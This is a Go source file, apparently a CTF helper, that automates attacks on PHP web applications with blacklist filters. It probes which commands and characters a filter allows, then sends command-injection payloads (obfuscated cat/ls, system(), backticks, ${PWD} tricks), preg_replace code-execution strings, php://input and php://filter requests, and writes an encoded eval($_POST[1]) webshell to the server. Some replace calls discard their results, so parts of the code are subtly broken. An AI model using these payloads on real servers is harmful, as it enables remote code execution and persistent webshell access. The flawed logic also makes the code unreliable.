package script

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
)

var flag = []string{"flag", "fl4g", "FLAG", "flag.php", "fl36D.php", "FLAG.php", "FLAG.PHP", "/flag", "/flag.php", "/flag.txt", "/var/www/html/flag", "/var/www/html/flag.php", "flag.txt"}

func Blacktest(guolv string, leixing string) (string, string) {

	com := ""
	char := ""
	//所有可用的系统命令遍历
	s := []string{"cat", "tac", "nl", "more", "wget", "grep", "tail", "flag", "less", "head", "sed", "cut", "awk", "strings", "od", "curl", "scp", "rm", "xxd", "mv", "cp", "pwd", "ls", "echo", "uniq", "sort", "%0a", "%09", "{$IFS}", "$IFS", "%0d", "."}
	if leixing == "s" {
		for _, h := range s {

			matches, _ := regexp.MatchString(guolv, h)
			if matches == false {
				com += h + " "
			}
		}
	}

	//所有可用的php函数遍历
	e := []string{"eval", "system", "shell_exec", "exec", "`", "echo", "fputs", "highlight_file", "show_source", "include", "assert", "flag", "php", "passthru", "popen", "proc_open", "pcntl_exec"}
	if leixing == "e" {
		for _, h := range e {

			matches, _ := regexp.MatchString(guolv, h)
			if matches == false {
				com += h + " "
			}
		}
	}

	//符号遍历
	for ch := 32; ch <= 63; ch++ {
		cha := fmt.Sprintf("%c", ch)
		matches, _ := regexp.MatchString(guolv, cha)
		if matches == false {
			char += cha
		}

	}

	for ch := 91; ch <= 126; ch++ {
		cha := fmt.Sprintf("%c", ch)
		matches, _ := regexp.MatchString(guolv, cha)
		if matches == false {
			char += cha
		}
	}

	return com, char
}

func Blackchuan(guolv string, command string, com string, char string) string {
	if strings.Contains(guolv, "flag") && !strings.Contains(guolv, "?") {
		strings.Replace(command, "flag", "f???", 1)
	} else if strings.Contains(guolv, "flag") && !strings.Contains(guolv, "*") {
		strings.Replace(command, "flag", "f*", 1)
	}

	if strings.Contains(char, "'") {
		if strings.Contains(com, "cat") {
			command = "ca''t flag"
		}
	}

	return command
}

func Blackguding(URL string, canshu string, m string, guolvleixing string, com string, char string, guolv string) string {

	response, _ := http.Get(URL)
	defer response.Body.Close()
	doc, _ := io.ReadAll(response.Body)
	yuanma := RemoveHTMLTags(string(doc))

	if guolvleixing == "s" {

		var result1 = "flag"
		var duqu = true
		//result1是要cat的文件名
		var yubeicommand string

		if strings.Contains(com, "ls") && strings.Contains(char, "l") && strings.Contains(char, "s") {
			yubeicommand = "ls"
			result1 = ls(yubeicommand, URL, canshu, m, yuanma, com, char, guolv)
		}

		//使用单引号绕过
		if !strings.Contains(com, "ls") && strings.Contains(char, "'") && strings.Contains(char, "l") && strings.Contains(char, "s") {
			yubeicommand = "l''s"
			result1 = ls(yubeicommand, URL, canshu, m, yuanma, com, char, guolv)
		}

		//使用反斜线绕过
		if !strings.Contains(com, "ls") && strings.Contains(char, "\\") && yubeicommand != "l''s" && strings.Contains(char, "l") && strings.Contains(char, "s") {
			yubeicommand = "l\\s"
			result1 = ls(yubeicommand, URL, canshu, m, yuanma, com, char, guolv)
		} else {
			fmt.Println("无法读取文件名,默认读取flag")
			duqu = false
		}

		if duqu == false {

			for _, fl := range flag {
				if strings.Contains(guolv, fl) {

					if strings.Contains(char, "?") {

						if strings.Contains(char, "f") {
							strings.Replace(result1, fl, "f???", -1)
						} else if strings.Contains(char, "l") {
							strings.Replace(result1, fl, "?l??", -1)
						} else if strings.Contains(char, "a") {
							strings.Replace(result1, fl, "??a?", -1)
						} else if strings.Contains(char, "g") {
							strings.Replace(result1, fl, "???g", -1)
						}

					} else if strings.Contains(char, "*") {

						if strings.Contains(char, "f") {
							strings.Replace(result1, "flag", "f*", -1)
						} else if strings.Contains(char, "l") {
							strings.Replace(result1, "flag", "*l*", -1)
						} else if strings.Contains(char, "a") {
							strings.Replace(result1, "flag", "*a*", -1)
						} else if strings.Contains(char, "g") {
							strings.Replace(result1, "flag", "*g", -1)
						}

					} else if strings.Contains(char, "'") {

						strings.Replace(result1, "flag", "f''l''a''g", -1)

					} else if strings.Contains(char, "\\") {

						strings.Replace(result1, "flag", "f\\l\\a\\g", -1)

					}

				}
			}
		}

		dancom := strings.Fields(com)

		for _, dan := range dancom {

			if dan == "cat" || dan == "tac" || dan == "nl" {

				yubeicommand = dan
				huixian := cat(yubeicommand, URL, canshu, m, yuanma, result1)

				return huixian

			} else if strings.Contains(char, "c") && strings.Contains(char, "a") && strings.Contains(char, "t") && strings.Contains(char, "'") {

				yubeicommand = "c''a''t"
				huixian := cat(yubeicommand, URL, canshu, m, yuanma, result1)
				return huixian

			} else if strings.Contains(char, "c") && strings.Contains(char, "a") && strings.Contains(char, "t") && strings.Contains(char, "\\") {

				yubeicommand = "c\\a\\t"
				huixian := cat(yubeicommand, URL, canshu, m, yuanma, result1)
				return huixian

			} else if strings.Contains(char, "n") && strings.Contains(char, "l") && strings.Contains(char, "'") {
				yubeicommand = "n''l"
				huixian := cat(yubeicommand, URL, canshu, m, yuanma, result1)
				return huixian
			} else if strings.Contains(char, "n") && strings.Contains(char, "l") && strings.Contains(char, "\\") {
				yubeicommand = "n\\l"
				huixian := cat(yubeicommand, URL, canshu, m, yuanma, result1)
				return huixian
			}

			//上面写差不多了,后面对于其他函数没写,md不写了

		}

	} else if guolvleixing == "e" {

		dancom := strings.Fields(com)
		for _, eval := range dancom {

			if eval == "system" || eval == "exec" || eval == "passthru" {

				if !strings.Contains(char, "(") || !strings.Contains(char, ")") || !strings.Contains(char, ";") {

					fmt.Println("error")

				} else {

					command := evalcat(URL, canshu, m, yuanma, com, char, guolv)

					if strings.Contains(command, " ") && strings.Contains(char, "'") {
						command = "'" + command + "'"
					} else if strings.Contains(command, " ") && strings.Contains(char, "\"") {
						command = "\"" + command + "\""
					}

					evalcom := eval + "(" + command + ");"
					result := GP(URL, canshu, m, evalcom)
					huixian := strings.Replace(result, yuanma, "", 1)
					huixian += "payload: " + command
					return huixian
				}

			}

			if (strings.Contains(char, "`") || eval == "shell_exec") && strings.Contains(com, "echo") {

				command := evalcat(URL, canshu, m, yuanma, com, char, guolv)

				if strings.Contains(command, " ") && strings.Contains(char, "'") {
					command = "'" + command + "'"
				} else if strings.Contains(command, " ") && strings.Contains(char, "\"") {
					command = "\"" + command + "\""
				}

				kongge := []string{"%0a", "%09", " ", "%0d"}
				var evalcom string

				for _, kong := range kongge {
					if !strings.Contains(guolv, kong) {
						if strings.Contains(char, "`") {
							evalcom = "echo" + kong + "`" + command + "`;"
						} else if eval == "shell_exec" {

							evalcom = "echo" + kong + "shell_exec(" + command + ");"
						}
						break
					}

				}

				result := GP(URL, canshu, m, evalcom)
				huixian := strings.Replace(result, yuanma, "", 1)
				huixian += "payload: " + command
				return huixian
			}

			if eval == "highlight_file" || eval == "show_source" {

				for _, file := range flag {

					command := eval + "(" + file + ")"
					result := GP(URL, canshu, m, command)
					huixian := strings.Replace(result, yuanma, "", 1)
					huixian += "payload: " + command
					return huixian

				}

			}

			//剩余函数 "fputs", "include", "assert",  "pcntl_exec", "popen", "proc_open", "assert","var_dump","print_r"

		}
	}
	return "error"
}

func Blackshoudong(com string, char string) string {
	duqu := []string{"cat", "tac", "nl", "more", "grep", "tail", "less", "head", "sed", "awk", "strings"}
	jianjieduqu := []string{"od", "xxd", "curl", "scp", "mv", "cp", "pwd"}
	var result string
	result = "可以直接使用这些命令读取文件: "
	for _, aaa := range duqu {
		if strings.Contains(com, aaa) {

			result += aaa
		}
	}
	result += "\n可以使用这些命令间接读取文件,详细请挨个查看命令用法: "
	for _, ccc := range jianjieduqu {
		if strings.Contains(com, ccc) {
			result += "ccc"
		}
	}

	result += "\n可以使用这些符号: " + char
	return result

}

func Pwd(URL string, canshu string, m string, com string) string {

	// 自定义 HTTP 客户端，跳过 TLS 证书验证
	customTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: customTransport}

	// 发起请求
	response, err := client.Get(URL)
	if err != nil {
		return "Error fetching URL: " + err.Error()
	}
	defer response.Body.Close()

	// 读取响应体
	doc, err := io.ReadAll(response.Body)
	if err != nil {
		return "Error reading response body: " + err.Error()
	}

	yuanma := RemoveHTMLTags(string(doc))

	xiexian := "${PWD::${##}}"
	t := "${PWD:${##}${#}:${##}}"

	var command string

	if strings.Contains(com, "cat") {

		command = xiexian + "???" + xiexian + "??" + t + " " + "????.???"

	} else if strings.Contains(com, "tac") {

		command = xiexian + "???" + xiexian + t + "??" + " " + "????.???"

	}

	result := GP(URL, canshu, m, command)
	huixian := strings.Replace(result, yuanma, "", 1)
	huixian += "payload: " + command
	return huixian
}

func Replace(URL string, canshu string, m string, command string) string {

	response, _ := http.Get(URL)
	defer response.Body.Close()
	doc, _ := io.ReadAll(response.Body)
	yuanma := RemoveHTMLTags(string(doc))

	if strings.Contains(yuanma, "preg_replace") {
		if strings.Contains(yuanma, "strtolower(\"\\\\1\")") {
			poc := "\\S*={${" + command + "}})"
			result := GP(URL, canshu, m, poc)
			return result
		}
	}

	return "error"
}

func Fewchar() string {
	//TODO:少量字符
	result := ""
	return result
}

func Weixieyi(URL string, guolv string, canshu string, m string, command string, RW string, xieru string) string {
	//TODO:php伪协议，包括include,file_put_contents

	mingling := []string{"php://", "file://", "data://text/plain,", "data://text/plain;base64,", "glob://", "phar://"}

	var resource string

	for _, file := range flag {
		matches, _ := regexp.MatchString(guolv, file)
		if matches == false {
			resource += fmt.Sprintf("/resource=%s", file)
		}
	}

	var canuse string

	//遍历mingling中可用的伪协议并存储在canuse参数中
	for _, fake := range mingling {
		matches, _ := regexp.MatchString(guolv, fake)
		if matches == false {
			canuse += fake
		}
	}

	//下面if是主要判断与执行部分

	if strings.Contains(canuse, "php") {
		//如果能用php伪协议

		if !strings.Contains(guolv, "input") {
			if m == "GET" {
				get_ := "php://input"
				post_ := "<?php system(\"" + command + "\");?>"
				result := REQUEST(URL, canshu, get_, post_)
				return result
			}
		} else if !strings.Contains(guolv, "filter") {

			php := fmt.Sprintf("php://filter/%s=", RW)

			var conv string

			if !strings.Contains(guolv, "base64") {

				if RW == "read" {

					conv = "convert.base64-encode"

				} else if RW == "write" {

					conv = "convert.base64-decode"

				} else if RW == "plus" {

					conv = "string.strip_tags|convert.base64-decode"

				}

			} else if !strings.Contains(guolv, "rot13") {

				if RW == "read" {

					conv = "string.rot13"

				} else if RW == "write" {

					conv = "string.rot13"

				}

			} else if !strings.Contains(guolv, "iconv") {

				if matched, err := regexp.MatchString("UCS-2", guolv); err == nil && !matched {
					conv = "convert.iconv.UCS-2LE.UCS-2BE"
				} else if matched, err = regexp.MatchString("UCS-4", guolv); err == nil && !matched {
					conv = "convert.iconv.UCS-4LE.UCS-4BE"
				} else if matched, err = regexp.MatchString("utf", guolv); err == nil && !matched {
					conv = "aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode" //没看懂,死马当活马医
				}

			} else if strings.Contains(guolv, "string") && RW == "plus" {
				conv = "string.%7%32ot13"
			}

			var payload string

			if RW == "read" {

				for _, file := range flag {
					matches, _ := regexp.MatchString(guolv, file)
					if matches == false {
						payload = php + conv + "/resource=" + file
						result := GP(URL, canshu, m, payload)

						//使用正则检测同时具有{}的行
						scanner := bufio.NewScanner(strings.NewReader(result))
						re := regexp.MustCompile(`{.*}`)
						result1 := ""

						for scanner.Scan() {
							line := scanner.Text()
							if re.MatchString(line) {
								result1 += line + "\n"
							}
						}

						if result1 != "" {
							result1 += "payload:" + payload
							return result1
						} else {
							continue
						}

					}
				}

			} else {

				if strings.Contains(conv, "base64") {

					payload = php + conv + "/resource=a.php&" + xieru + "=PD9waHAgZXZhbCgkX1BPU1RbMV0pO2hpZ2hsaWdodF9maWxlKF9fRklMRV9fKTs/Pg==" //<?php eval($_POST[1]);highlight_file(__FILE__);?>

				} else if strings.Contains(conv, "ot13") {

					payload = php + conv + "/resource=a.php&" + xieru + "=<?cuc riny($_CBFG[1]);uvtuyvtug_svyr(__SVYR__);?>" //<?php eval($_POST[1]);highlight_file(__FILE__);?>

				} else if strings.Contains(conv, "UCS-2") {

					payload = php + conv + "/resource=a.php&" + xieru + "=?<hp pvela$(P_SO[T1\"]\";)ihhgilhg_tifel_(F_LI_E)_?;a>" //<?php eval($_POST["1"]);highlight_file(__FILE__);?>a

				} else if strings.Contains(conv, "UCS-4") {

					payload = php + conv + "/resource=a.php&" + xieru + "=hp?<ve p$(laSOP_1\"[T;)]\"hgihhgilif_t_(elLIF_)__Ea>?;" //<?php eval($_POST["1"]);highlight_file(__FILE__);?>a

				}
			}

			result := GP(URL, canshu, m, payload)
			result += "payload:" + payload
			return result

		}

	} else if strings.Contains(canuse, "file") {

		for _, file := range flag {
			matches, _ := regexp.MatchString(guolv, file)
			if matches == false {
				payload := fmt.Sprintf("file://%s", file)
				result := GP(URL, canshu, m, payload)

				//使用正则检测同时具有{}的行
				scanner := bufio.NewScanner(strings.NewReader(result))
				re := regexp.MustCompile(`{.*}`)
				result1 := ""

				for scanner.Scan() {
					line := scanner.Text()
					if re.MatchString(line) {
						result1 += line + "\n"
					}
				}

				if result1 != "" {
					result1 += "payload:" + payload
					return result1
				} else {
					continue
				}

			}
		}

	} else if strings.Contains(canuse, "data") {
		//未完待续
	} else if strings.Contains(canuse, "glob") {
		//暂时不会利用
	} else if strings.Contains(canuse, "phar") {
		//暂时不会利用
	}
	return "error"
}
